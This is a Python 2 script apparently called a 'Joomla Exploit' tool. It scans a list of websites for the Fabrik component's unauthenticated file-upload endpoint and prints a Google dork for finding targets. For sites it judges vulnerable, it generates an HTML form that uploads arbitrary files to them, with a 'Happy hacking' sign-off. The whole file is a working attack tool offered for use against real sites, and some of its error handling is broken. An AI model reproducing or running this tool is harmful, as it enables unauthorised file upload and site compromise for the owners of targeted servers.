#!/bin/env python2
# script owner="sachin"
# created on date 27/10/2018
# whats app number 8105190452 
# if u get any bugs send to this number
# i am studying 4th year civil
#

import os
import sys
import time
import urllib2

def cls():
	if sys.platform == 'linux2':
		os.system("clear")
	else:
		os.system("cls")

#vulnerability scanner

def scanner():

 if os.path.exists(web):
	pass
 else:
	print ''
	print '\033[1;39m[!] \033[1;31mFile does not exists\033[1;39m'
	print ''
	return
 fi1 = open(web, "r")
 fi2 = fi1.readlines()
 fi1.close()

 for site in fi2:
 	site = site.rstrip()
	darsh = site + payload
	try:
         try:
	  try:
           ajay = urllib2.urlopen(darsh).read()
	  except urllib2.HTTPError:
		 pass
	 except urllib2.URLError:
		pass
	 pat = "check.txt"
 	 if os.path.exists(pat):
        	 os.remove(pat)
         try:
 	  check1 = open("check.txt", "w")
 	  check1.write(ajay)
 	  check1.close()
	 except UnboundLocalError:
	  pass
 	 check = open("check.txt" , "r")
 	 check2 = check.read()
 	 check.close()

 	 vuln = open("vul.txt", "r")
 	 vu = vuln.read()
 	 vuln.close()
	
	 if check2 != vu:
		 print "\033[1;39m"
		 print site 
		 print check2
		 print "\033[1;31m[-] Site is not vulnerable\033[1;39m"
		 print ''
	 else:
		 print '\033[1;39m'
		 print site
		 print check2
		 print "\033[1;32m[+] Site is vulnerable\033[1;39m"
		 print ''
	except ValueError:
                pass

logo1 = '''
\033[1;33mWARNING :\033[1;39m I am not responsible for your actions
\033[1;36m
'''
print logo1
print ''
x = raw_input("press enter to continue ...")
if sys.platform == 'linux2':
	os.system("clear")
else:
	os.system("cls")

logo2 = '''
\t   |  |-------    __     _____  
\t   |  |       |  /  \   |       |   \033[1;39m VERSION : \033[1;32m1.3\033[1;39m
\t\033[1;36m   |  |       | |    |  |_____  |   \033[1;32m JOOMLA EXPLOIT\033[1;36m
\t   |  |       | |    |        | |_____
\t   |  |       | |    |        | |     |
\t|__/  |-------   \__/ \ ______| |     |

'''
print logo2
print "\033[1;31mDork :\033[1;39m inurl:index.php/component/fabrik/ site:\033[1;39m"
print ""
def hlp():
 help= '''\033[1;39m
\t Commands      Description
\t\033[1;31m ========      ===========\033[1;39m
\t
\t -h/help       Help
\t set url       set url <targeted site>
\t set file      set file <filename.txt>
\t clear         clear screen
\t scan          Site vulnerability sacanner
\t run           Creates payload
\t about         My self
\t exit          Exit the program
\t\033[1;39m
'''
 print help

main = ""
u = ""
payload = "/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"
web = ""
while True:
	try:
	 cod = raw_input("\033[1;39mCoder \033[1;32m>>\033[1;32m ")
	 coder = cod.split()
	 if not coder:
                print "<\033[1;31minvalid command\033[1;39m>"
                continue
	 elif coder[0] == "help":
		hlp()
	 elif coder[0] == "scan":
		scanner()
	 elif coder[0] == "about":
		print '\033[1;39m'
		print '\t Name   : Sachin'
		print '\t Country: India'
		print '\t Channel: BBSAD'
		print '\t Link   : https://youtu.be/87GMKQq_nTs'
		print '\t'

	 elif coder[0] == "-h":
		hlp()
	 elif coder[0] == "exit":
		print "\033[1;39m"
		break
	 elif coder[0] == "set":
		if coder[1] == "url":
		 u = str(coder[2])
		elif coder[1] == "file":
		 web = str(coder[2])
		else:
		 print "<\033[1;31minvalid command\033[1;39m>"
		 pass
	 elif coder[0] == "exit":
		break
	 elif coder[0] == "run":
		if u == "":
			print ''
			print "[x] Please provide url"
			print ''
			continue 
		ur = u + payload
		try:
		 try:
		  main = urllib2.urlopen(ur).read()
		 except connection:
		  	pass
		except NameError:
		      print ''
		      print "[!] Something went wrong or test another site"
		      print ''
		      continue
		pat = "check.txt"
		if os.path.exists(pat):
			os.remove(pat)

		check1 = open("check.txt", "w")
		check1.write(main)
		check1.close()

		check = open("check.txt" , "r")
		check2 = check.read()
		check.close()

		vuln = open("vul.txt", "r")
		vu = vuln.read()
		vuln.close()
		
		print ''
		print check2

		if check2 != vu:
			print "\033[1;31m[-] Site is not vulnerable\033[1;39m"
			print ''
		else:
			print "[+] Site is vulnerable"
			sachin = "payload/index.html"

			if os.path.exists(sachin):
				os.remove(sachin)

			expl = open("payload/index.html" , "w")
			expl.write("<html><head> \n")
			expl.write("<title>Joomla Exploit</title> \n")
			expl.write('</head><body background=""> \n')
			expl.write('<link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Amaranth"> \n')
			expl.write('<style> \n')
			expl.write('   body { \n')
			expl.write('   font-family:Amaranth; \n ')
			expl.write('   } \n')
			expl.write('</style> \n')
			expl.write('<center><br><br><br><br><br><br><br><br><br><br> \n')
			expl.write('<h1 style="color:green;">Joomla Exploit</h1> \n')
			expl.write('<form method="POST" action="'+ur+'" enctype="multipart/form-data"> \n')
			expl.write('<input type="file" name="file"><button>Exploit</button> \n')
			expl.write('</form> \n')
			expl.write('</<center></body></html> \n')
			expl.close()

			print ''

			bairamma = open("payload/index.html" , "r")
			boothappa = bairamma.read()
			bairamma.close()
			
			print ''
			print "\t\033[1;39m Payload "
			print "\t\033[1;31m ======="
			print ''
			print boothappa
			print ''
			print "\033[1;32mPayload generated in [ payload/index.html ] Happy hacking ...\033[1;39m"
			print ''

	 elif coder[0] == "show":
		if coder[1] == "options":
			print '\033[1;39m'
			print "\t Input Options"
			print '\t\033[1;31m =============\033[1;39m'
			print ""
			print '\t url :\033[1;32m ',u
			print '\033[1;39m'
		else:
			print "<\033[1;31minvalid command\033[1;39m>"
			pass
	 elif coder[0] == "clear":
		cls()
	 else:
		print "<\033[1;31minvalid command\033[1;39m>"
		continue
	except IndexError:
	 print "<\033[1;31minvalid command\033[1;39m>"
	 pass
